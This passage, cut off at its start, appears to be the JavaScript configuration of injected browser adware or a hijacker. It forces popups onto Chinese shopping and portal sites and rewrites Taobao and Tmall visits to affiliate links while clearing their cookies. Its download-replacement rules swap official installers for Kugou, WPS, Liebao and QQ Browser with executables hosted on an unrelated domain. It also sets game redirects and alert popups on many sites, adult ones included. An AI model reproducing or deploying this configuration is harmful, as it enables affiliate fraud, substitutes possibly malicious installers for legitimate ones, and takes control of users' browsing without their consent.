.cn|123.duba.net)",
            whitelist:/30807-0001|30807-0002|37818-0002|30807-0004/,
            param: "/essw/"+ChannelIdjy,
            target:"/p",
            cookie:{
                jumpNum:5,
                name:"essw",
                cookieTime:86400,
                clears:[]
            }
        },
        popup: {
            src:"http://boardx.huanqiu.com/union_layer.js",
            cid:"u2824614",
            size:"300*250",
            whitelist:{
                "huodong.taobao.com":{"PopupTime" : 1800},
                "item.taobao.com/item.htm?":{"PopupTime" : 1800},
                "s.taobao.com/list?":{"PopupTime" : 1800},
                "list.taobao.com/itemlist":{"PopupTime" : 1800},
                "chi.taobao.com/itemlist":{"PopupTime" : 1800},
                "www.taobao.com/markets":{"PopupTime" : 1800},
                "s.taobao.com/search":{"PopupTime" : 1800},
                "list.tmall.com/search_product.htm?":{"PopupTime" : 1800},
                "detail.tmall.com/item.htm?":{"PopupTime" : 1800},
                "chaoshi.detail.tmall.com/item.htm?":{"PopupTime" : 1800},
                "pages.tmall.com/wow/chaoshi/act":{"PopupTime" : 1800},
                "detail.ju.taobao.com/home.htm?":{"PopupTime" : 1800},
                "ju.taobao.com/tg/brand_items.htm?":{"PopupTime" : 1800},
                "ai.taobao.com/search/index.htm?":{"PopupTime" : 1800},
                "item.jd.com":{"PopupTime" : 1800},
                "item.yhd.com/item":{"PopupTime" : 1800},
                "s.yhd.com/item":{"PopupTime" : 1800},
                "www.vip.com/detail":{"PopupTime" : 1800},
                "product.suning.com":{"PopupTime" : 1800},
                "www.bilibili.com":{"PopupTime" : 1800},
                "www.4399.com":{"PopupTime" : 1800},
                "ssjj.4399.com":{"PopupTime" : 1800},
                "dts.37.com":{"PopupTime" : 1800},
                "www.sohu.com":{"PopupTime" : 1800},
                "www.youku.com":{"PopupTime" : 1800},
                "www.sina.com.cn":{"PopupTime" : 1800}
            }
        },
        tmall: {
           "tmall.com": {
                chance: "100%",
                hostUrl: "http://s.click.taobao.com/t?e=m%3D2%26s%3D9HuozCBo6v8cQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2Z76R%2BwG3uESyqeBTj9FJSggccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtvdXLFE7SC8Xix379%2FgWHD1l5j7LRuVuGxxiXvDf8DaRs%3D",
                vague: {
                    "%u55B5%u9C9C%u751F" : {  //喵鲜生
                        url:"http://s.click.taobao.com/t?e=m%3D2%26s%3DlHwrY2GhCfscQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2bms%2FnjObYvrhEvvQe3dPn0gccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4L0CYBEjBf0rFG7FrgRfauWx379%2FgWHD1uoPXyFbMSxd"
                    },
                    "%u5929%u732B%u7535%u5668%u57CE" : {  //天猫电器城
                        url:"http://s.click.taobao.com/t?e=m%3D2%26s%3DM5UCcgBuTpUcQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2YKG2zbhiOXIZW7hPg9HazggccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtv9eFCgDS%2F%2FJ8k%2FCKKDVvEs8hC7k91emiMomfkDJRs%2BhU%3D"
                    },
                    "%u5929%u732B%u8D100%u5E02" : {
                        url:"http://s.click.taobao.com/t?e=m%3D2%26s%3DA9YKK4I4N6IcQipKwQzePDAVflQIoZeppRe%2F8jaAHci5VBFTL4hn2TtnZgI8Ebsk7LeyVIpD4eggccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FIzCt3C23Pi1mV10D5zBFYEcSpj5qSCmbA%3D"
                    },
                    "%u5929%u732B%u533B%u836F%u9986" : {
                        url:"http://s.click.taobao.com/t?e=m%3D2%26s%3DxkgQM8EWxAAcQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2R5uZAMa%2Bk9XxeoNewupcd4gccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4L0CYBEjBf0rIrKcpWub4wok%2FCKKDVvEs8hC7k91emiMomfkDJRs%2BhU%3D"
                    },
                    "%u5929%u732B%u5973%u88C5" : {
                        url: "http://s.click.taobao.com/t?e=m%3D2%26s%3DQ4fsRPpbEY4cQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2Qukrx%2FmbH%2BPr8hK%2FDw%2Bbm0gccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtvynfmdbxM1BlPnXgIvLorkxb3kPS3do6KXaMPXfzA%2Fl0%3D"
                    },
                    "%u5929%u732B%u51100%u8863" : {
                        url: "http://s.click.taobao.com/t?e=m%3D2%26s%3DowaTyiDLSQYcQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2UOgrfDvqCNrNIp4fcwrAVkgccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtvHQY9KJ4Id1onvIg6mh7aOtTgynAQNZstIYULNg46oBA%3D"
                    },
                    "%u5929%u732B%u7537%u88C5" : {
                        url: "http://s.click.taobao.com/t?e=m%3D2%26s%3Dx6wE8W2v1uIcQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2RBEELCb65R5YFMBzHxYoCMgccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4L0CYBEjBf0rDqiH1eKZ%2BMpPnXgIvLorkzRVCPL3LSyAIYULNg46oBA%3D"
                    },
                    "%u5929%u732B%u7F51%u4E0A%u8425%u4E1A%u5385":{
                        url:"http://s.click.taobao.com/t?e=m%3D2%26s%3Dil5IkLunxaocQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2Y%2B%2FAiBEHo7SBuky%2F0Sep%2BEgccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtv5uV0QuDvoVEk%2FCKKDVvEs8hC7k91emiMomfkDJRs%2BhU%3D"
                    },
                    "%u624B%u673A%u9986" : {
                        url: "http://s.click.taobao.com/t?e=m%3D2%26s%3D23sQwVNd0J0cQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2T3yZYCKitbnMlIj6E1wLr4gccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtvQ9KWgmbtCivCBGGGuOtGWBoeSzb988W7cSpj5qSCmbA%3D"
                    },
                    "%u5929%u732B%u8155%u8868%u9891%u9053" : {
                        url: "http://s.click.taobao.com/t?e=m%3D2%26s%3DfoYfnvKzzIgcQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2T3yZYCKitbnQev46Oo1utQgccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtvp7ahF1cp9%2FHRgEFLcH%2B7ENTgynAQNZstIYULNg46oBA%3D"
                    }
                }
            },
            "www.taobao.com":{
                chance: "30%",
                hostUrl : "http://ai.taobao.com",
                precise : "%u6DD8%u5B9D%u7F51-%u6DD8%21%u6211%u559C%u6B22",
            },
            "ai.taobao.com":{
                chance: "100%",
                hostUrl : "http://ai.taobao.com?pid=mm_96301239_9120154_30522442"
            }, 
            "ju.taobao.com":{
                chance: "100%",
               hostUrl : "http://s.click.taobao.com/t?e=m%3D2%26s%3DXJQ5rztr5zccQipKwQzePCperVdZeJviEViQ0P1Vf2kguMN8XjClAmKp8sAmMckYVpTHHGZ%2BJu8IoxXJTabAal8EMx899m7ToIVcF2VNk3KH3tytNoT7sOo0BcZWWIRYYA%2FDpPH01wK9AmARIwX9K%2BAjBDXvuqoU47FHjfsActnGDF1NzTQoPw%3D%3D"
            },
            "www.alitrip.com":{
                chance: "100%",
                hostUrl: "http://s.click.taobao.com/t?e=m%3D2%26s%3DtxGJJ%2BvrYYscQipKwQzePCperVdZeJviEViQ0P1Vf2kguMN8XjClAmKp8sAmMckY3AjRQckUmNkIoxXJTabAal8EMx899m7ToIVcF2VNk3KH3tytNoT7sH7uq6sLYIqu0Q7QOybCaQxAFEHVckI7b3VyxRO0gvF4S5LbtMfCISI%2BTRsusMUdX6Jn5AyUbPoV",
            },
            "www.taobao.com": {
                chance: "30%",
                hostUrl: "http://ai.taobao.com",
                precise: "%u6DD8%u5B9D%u7F51-%u6DD8%21%u6211%u559C%u6B22",
            },
        },
        flowcount: {
            "ai.taobao.com": {
                pid: 'mm_122197094_22032725_73500374',
                param: "/ai/"+ChannelIdjy,
                target:  "/p",
                chance:"50%"
            }
        },
        replace: {
            "%u9177%u72D7%u97F3%u4E50" : {
                "baidu" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/kugou7_3655.exe",
                    keys:[ "rj.baidu.com" , "%u767E%u5EA6%u8F6F%u4EF6%u4E2D%u5FC3"]
                },
                "sogou" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/kugou7_3655.exe",
                    keys:[ "xiazai.sogou.com" , "%u641C%u72D7%u4E0B%u8F7D"]
                }
            },
            "WPS" : {
                "baidu" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/WPS_6001.100110.exe",
                    keys:[ "rj.baidu.com" , "%u767E%u5EA6%u8F6F%u4EF6%u4E2D%u5FC3"]
                },
                "sogou" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/WPS_6001.100110.exe",
                    keys:[ "xiazai.sogou.com" , "%u641C%u72D7%u4E0B%u8F7D"]
                }
            },
            "%u730E%u8C79%u5B89%u5168%u6D4F%u89C8%u5668" : {
                "baidu" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/ksbinstaller_96_001124.exe",
                    keys:[ "rj.baidu.com" , "%u767E%u5EA6%u8F6F%u4EF6%u4E2D%u5FC3"]
                }
            },
            "%u730E%u8C79%u6D4F%u89C8%u5668" : {
                "sogou" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/ksbinstaller_96_001124.exe",
                    keys:[ "xiazai.sogou.com" , "%u641C%u72D7%u4E0B%u8F7D"]
                }
            },
            "QQ%u6D4F%u89C8%u5668" : {
                "baidu" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/V8._85805_20150906193644.exe",
                    keys:[ "rj.baidu.com" , "%u767E%u5EA6%u8F6F%u4EF6%u4E2D%u5FC3"]
                },
                "sogou" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/V8._85805_20150906193644.exe",
                    keys:[ "xiazai.sogou.com" , "%u641C%u72D7%u4E0B%u8F7D"]
                }
            },
            "%u817E%u8BAF%u7535%u8111%u7BA1%u5BB6" : {
                "baidu" : {
                    chance: "100%",
                    downloadUrl: "http://dlied6.qq.com/invc/xfspeed/qqpcmgr/data/qudao/qqpcmgr_v12.6.18842.202_120007131_0.exe",
                    keys:[ "rj.baidu.com" , "%u767E%u5EA6%u8F6F%u4EF6%u4E2D%u5FC3"]
                }
            },
            "%u7535%u8111%u7BA1%u5BB6" : {
                "sogou" : {
                    chance: "100%",
                    downloadUrl: "http://dlied6.qq.com/invc/xfspeed/qqpcmgr/data/qudao/qqpcmgr_v12.6.18842.202_120007131_0.exe",
                    keys:[ "xiazai.sogou.com" , "%u641C%u72D7%u4E0B%u8F7D"]
                }
            }
        },
        officialReplace:{
            "download.kugou.com" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/kugou7_3655.exe",
                     keys: ["kugou_pc"]
            },
            "www.wps.cn" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/WPS_6001.100110.exe",
                    keys: ["W.P.S.6393.19.552.exe"]
            },
            "www.liebao.cn" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/ksbinstaller_96_001124.exe",
                    keys: ["KSbrowser_.*?.exe"]
            },
            "browser.qq.com" : {
                    chance: "100%",
                    downloadUrl: "http://lxdl.591fq.com/V8._85805_20150906193644.exe",
                    keys: ["QQBrowser_Setup_","QQBrowser_Setup_.*?.exe"]
            },
            "guanjia.qq.com" : {
                    chance: "100%",
                    downloadUrl: "http://dlied6.qq.com/invc/xfspeed/qqpcmgr/data/qudao/qqpcmgr_v12.6.18842.202_120007131_0.exe",
                    keys: ["QQPCDownload.*?.exe","qqpcmgr_v.*?.exe"]
            }
        },
        game: {
            "gb" :{
                hostUrl: "https://www.971fl.com",
                whitelist:"^(w*?.)?((so|baidu|fang|taobao|tmall|xunlei|kugou|hc360|17173).com$|360.cn$)|.*?(gov|edu|org).(w*?)$",
                target:"/g",
                intervalTime:0,
                cookieName:"gameing",
                cookieTime:3600,
                gotoUrl:"http://706893.com"
            },
            "sf" :{
                hostUrl: "https://www.971fl.com",
                target:"/g",
                intervalTime:0,
                cookieName:"sologg",
                cookieTime:3600,
                gotoUrl:"https://4pk.sxsaa.com"
            }
        },
        total:{
            hostUrl: "https://www.971fl.com",
            target:"/t",
            channel: ChannelIdjy
        },
        sf:{
            hostUrl: "https://www.971fl.com",
            whitelist:"^(w*?.)?((so|baidu|fang|taobao|tmall|xunlei|kugou|hc360|17173).com$|360.cn$)|.*?(gov|edu|org).(w*?)$",
            target:"/s",
            gotoUrl:"https://4pk.sxsaa.com"
        },
        alert:{
            "0":{
                vague:"www.manhuatai.com|car.autohome.com.cn|www.panda.tv|mini.eastday.com|www.huya.com|www.shenmanhua.com|www.kanman.com|5555av.co|www.iyouman.com|sports.sina.com.cn|b.faloo.com|price.pcauto.com.cn|live.bilibili.com|www.sina.com.cn|www.huajiao.com|www.yqimh.net|www.5555av.co|www.zhanqi.tv|www.9c9v.com|www.lieqinews.com|www2.yiren666.com|www.mm131.com|www.dfvod.com|www.quanmin.tv|www.qiwen007.com|bx.chinazhonghai.com|cl.thoe.pw|haha.9ku.com|www.sis11.com|toutiao.china.com|www.beiwo.tv|1024x3.click|www.javbus2.com|99kk3.com|s2.lulujjs.biz|www.svmh8.com|cl.friu.pw|sudi58.com|x2.pix378.info|1024xx3.pw|www.gavbus6.com|cl.wedid.us",
                type:"1",
                alertUrl: "http://www.kd028.com/qiwen/25486.html",
                browserVague:"BIDUBrowser|QQBrowser|UBrowser",
                alertDisplay:"block",
                width:"300px",
                height:"250px",
                shutdown: 0,
                shutdownTime:5000,
                cookie:{
                    Time:3600
                },
                status:0
            },
            "1":{
                vague:"taobao.com|tmall.com",
                type:"1",
                alertUrl: "https://www.kd028.com/yishi/34570.html",
                alertDisplay:"block",
                width:"300px",
                height:"355px",
                shutdown: 0,
                shutdownTime:5000,
                cookie:{
                    Time:3600
                },
                status:1
            },
            "2":{
                vague:"jd.com|sina.com.cn|yhd.com|vip.com",
                type:"1",
                alertUrl: "https://www.kd028.com/qiguang/44570.html",
                alertDisplay:"block",
                width:"300px",
                height:"355px",
                shutdown: 0,
                shutdownTime:5000,
                cookie:{
                    Time:86400
                },
                status:0
            }
        },
        onclicktotal:{
            hostUrl: "https://www.971fl.com",
            target:"/ct",
            channel: ChannelIdjy,
            indexof: ['.apk', '.exe']
        },
        taobao: {
            vague:"taobao.com|tmall.com",
            chance:"10%",
            rf : "http://www.98fanli.com",
            ajaxUrl : "https://g.click.taobao.com/display",
            indexof: ['#'],
            cookie:{
                clears:["taobao.com" , "tmall.com"]
            },
            url: "http://www.966cu.com/che/taobao",
            status:1
        }
    }
};
Config.hostname = location.hostname;
Config.search   = location.search;
Config.href     = location.href;